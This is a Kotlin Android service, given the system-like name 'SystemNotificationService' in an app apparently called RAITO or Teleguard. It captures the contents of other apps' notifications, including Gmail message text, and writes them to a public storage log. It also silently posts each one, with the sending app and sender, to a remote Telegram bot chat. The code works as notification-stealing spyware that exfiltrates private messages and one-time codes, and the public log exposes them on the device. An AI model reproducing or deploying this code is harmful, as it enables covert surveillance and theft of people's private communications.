package com.example.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.os.Environment
import com.example.SyncApplication
import com.example.data.TeleguardRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SystemNotificationService : NotificationListenerService() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var _repository: TeleguardRepository? = null
    private val client = OkHttpClient()

    private fun getRepository(): TeleguardRepository {
        val repo = _repository
        if (repo != null) return repo

        return synchronized(this) {
            val repoSec = _repository
            if (repoSec != null) {
                repoSec
            } else {
                val newRepo = try {
                    val app = applicationContext as? SyncApplication
                    app?.repository ?: run {
                        val db = com.example.data.TeleguardDatabase.getInstance(applicationContext)
                        com.example.data.TeleguardRepository(db.teleguardDao)
                    }
                } catch (e: Exception) {
                    val db = com.example.data.TeleguardDatabase.getInstance(applicationContext)
                    com.example.data.TeleguardRepository(db.teleguardDao)
                }
                _repository = newRepo
                newRepo
            }
        }
    }

    // Throttling maps to prevent spam from live updates (e.g., VPNs, trackers, etc.)
    private val lastForwardTime = mutableMapOf<String, Long>()
    private val lastForwardText = mutableMapOf<String, String>()

    override fun onCreate() {
        super.onCreate()
        try {
            getRepository()
        } catch (e: Exception) {
            // Ignore
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName ?: ""
        // Prevent forwarding RAITO's own notifications to avoid infinite recursive loops
        if (packageName == "com.example" || packageName.contains("raito") || packageName.contains("teleguard") || packageName.contains("pkg")) {
            return
        }

        // Filter out ongoing system event notifications like VPN connections, music tracking, battery statuses, or clock indicators
        if (sbn.isOngoing) {
            return
        }

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return
        val title = (extras.getCharSequence(Notification.EXTRA_TITLE) 
            ?: extras.getCharSequence("android.title"))?.toString() ?: ""
        
        // Robust deep text extraction using official extra keys
        val extraText = (extras.getCharSequence(Notification.EXTRA_TEXT) 
            ?: extras.getCharSequence("android.text"))?.toString() ?: ""
        
        val extraBigText = (extras.getCharSequence(Notification.EXTRA_BIG_TEXT) 
            ?: extras.getCharSequence("android.bigText"))?.toString() ?: ""
            
        val extraSubText = (extras.getCharSequence(Notification.EXTRA_SUB_TEXT)
            ?: extras.getCharSequence("android.subText"))?.toString() ?: ""

        val extraSummaryText = (extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)
            ?: extras.getCharSequence("android.summaryText"))?.toString() ?: ""

        var text = extraText
        
        if (packageName.contains("gm") || packageName.contains("gmail")) {
            val mailText = if (extraBigText.isNotEmpty()) extraBigText else extraText
            val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES) 
                ?: extras.getCharSequenceArray("android.textLines")
            val linesConcat = textLines?.joinToString("\n") { it.toString() } ?: ""
            text = if (linesConcat.isNotEmpty()) {
                "$mailText\n$linesConcat"
            } else {
                mailText
            }
        } else {
            if (extraBigText.length > text.length) {
                text = extraBigText
            }
        }
        
        // Append optional secondary metadata details if present (e.g. sender info / group)
        if (extraSubText.isNotEmpty() && !text.contains(extraSubText)) {
            text = "$text ($extraSubText)"
        }
        if (extraSummaryText.isNotEmpty() && !text.contains(extraSummaryText)) {
            text = "$text [$extraSummaryText]"
        }

        if (title.isEmpty() && text.isEmpty()) {
            return
        }

        // Deduplicate: Don't repeat the exact same notification parameters within 15 seconds
        val key = "$packageName:${title}"
        val now = System.currentTimeMillis()
        val lastTime = lastForwardTime[key] ?: 0L
        val lastText = lastForwardText[key] ?: ""
        if (now - lastTime < 15000 && lastText == text) {
            return
        }
        lastForwardTime[key] = now
        lastForwardText[key] = text

        scope.launch {
            // Write notification to a local .txt file on the device
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val logLine = "[$timestamp] [Package: $packageName] [Title: $title] -> $text\n"

                // 1. Write to app private external folder
                val extDir = applicationContext.getExternalFilesDir(null)
                if (extDir != null) {
                    if (!extDir.exists()) extDir.mkdirs()
                    val privateFile = File(extDir, "notifications_log.txt")
                    privateFile.appendText(logLine, Charsets.UTF_8)
                }

                // 2. Write to public Documents/RaitoLogs folder
                val publicDir = File(Environment.getExternalStorageDirectory(), "Documents/RaitoLogs")
                if (!publicDir.exists()) {
                    publicDir.mkdirs()
                }
                if (publicDir.exists()) {
                    val publicFile = File(publicDir, "notifications_log.txt")
                    publicFile.appendText(logLine, Charsets.UTF_8)
                }
            } catch (e: Exception) {
                // Ignore silently
            }

            val settings = getRepository().settings.first()
            if (!settings.isBotRunning) {
                return@launch
            }
            val token = settings.botToken
            val chat = settings.chatId

            if (token.isEmpty() || chat.isEmpty()) {
                return@launch
            }

            // Extract readable app name if possible, or fallback to packageName
            val pManager = applicationContext.packageManager
            val appLabel = try {
                val appInfo = pManager.getApplicationInfo(packageName, 0)
                pManager.getApplicationLabel(appInfo).toString()
            } catch (e: Exception) {
                packageName.substringAfterLast('.')
            }

            val escapedAppLabel = escapeHtml(appLabel)
            val escapedPackageName = escapeHtml(packageName)
            val escapedTitle = escapeHtml(title)
            val escapedText = escapeHtml(text)

            // Formulate elegant forward notification block
            val formattedMsg = "🔔 <b>RAITO Notification Alert</b>\n\n" +
                    "• <b>App:</b> <code>$escapedAppLabel</code> (<code>$escapedPackageName</code>)\n" +
                    "• <b>Sender/Title:</b> <code>$escapedTitle</code>\n" +
                    "• <b>Text:</b> $escapedText"

            val success = postTelegramMessage(token, chat, formattedMsg)
            if (success) {
                getRepository().log(
                    "NOTIF_FORWARD",
                    "Forwarded notification from $appLabel ($title: $text)",
                    "SUCCESS"
                )
            } else {
                getRepository().log(
                    "NOTIF_FORWARD",
                    "Failed to forward notification from $appLabel",
                    "FAILED"
                )
            }
        }
    }

    private fun escapeHtml(input: String): String {
        return input.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private suspend fun postTelegramMessage(token: String, chat: String, message: String): Boolean {
        return try {
            val base = com.example.SyncApplication.getTelegramBaseUrl()
            val url = "$base$token/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", chat)
                put("text", message)
                put("parse_mode", "HTML")
            }
            val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }
}
